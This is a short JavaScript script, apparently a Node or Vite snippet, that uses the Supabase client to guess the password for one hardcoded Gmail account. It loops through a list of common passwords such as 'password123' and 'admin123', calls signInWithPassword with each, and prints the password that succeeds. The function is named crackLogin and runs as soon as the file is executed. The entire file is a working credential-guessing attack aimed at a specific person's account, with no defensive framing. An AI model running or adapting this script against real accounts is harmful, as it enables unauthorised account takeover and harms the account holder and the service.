import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

async function crackLogin() {
  const email = 'oomkaragarkhed0710@gmail.com';
  const passwords = [
    'password',
    'password123',
    'admin123',
    '123456',
    'Sentinel123!',
    'SecurePass123!',
    'test1234'
  ];

  for (const p of passwords) {
    console.log(`Trying ${p}...`);
    const { data, error } = await supabase.auth.signInWithPassword({ email, password: p });
    if (!error) {
      console.log(`SUCCESS! Password is: ${p}`);
      return;
    }
  }
  console.log('Failed to find password.');
}

crackLogin();
